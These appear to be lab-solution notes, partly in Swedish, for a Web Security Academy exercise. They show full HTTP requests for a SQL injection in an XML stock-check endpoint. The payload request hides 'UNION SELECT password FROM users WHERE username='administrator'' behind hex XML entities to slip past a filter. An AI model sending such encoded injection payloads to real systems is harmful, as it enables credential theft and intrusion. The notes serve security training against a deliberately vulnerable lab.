Identify the susceptible param and the encoding som den sväljer. Notera att det inte är en *'* efter 1 då den tolkas som en integer och då är det bara att fortsätta skriva som vanligt
##### Payload request
POST /product/stock HTTP/2
Host: 0a510051033c36db83fcfa8300b200de.web-security-academy.net
Cookie: session=wWslsPV2FFhvfftbN5i9i3cGOJ6ckRxx
Content-Length: 496
Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
Content-Type: application/xml
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Sec-Ch-Ua-Platform: "macOS"
Accept: */*
Origin: https://0a510051033c36db83fcfa8300b200de.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a510051033c36db83fcfa8300b200de.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

```<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>2</productId><storeId>1 &#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;&#x20;&#x57;&#x48;&#x45;&#x52;&#x45;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x3d;&#x27;&#x61;&#x64;&#x6d;&#x69;&#x6e;&#x69;&#x73;&#x74;&#x72;&#x61;&#x74;&#x6f;&#x72;&#x27;</storeId> </stockCheck>```


##### Base request
POST /product/stock HTTP/2
Host: 0a3c0091038ee7da805f9ea1004000b0.web-security-academy.net
Cookie: session=ggYKCz8IGNrE4bzBVHR00mILvUnpJztF
Content-Length: 111
Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
Content-Type: application/xml
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Sec-Ch-Ua-Platform: "macOS"
Accept: */*
Origin: https://0a3c0091038ee7da805f9ea1004000b0.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a3c0091038ee7da805f9ea1004000b0.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>
1
</productId><storeId>1</storeId></stockCheck>
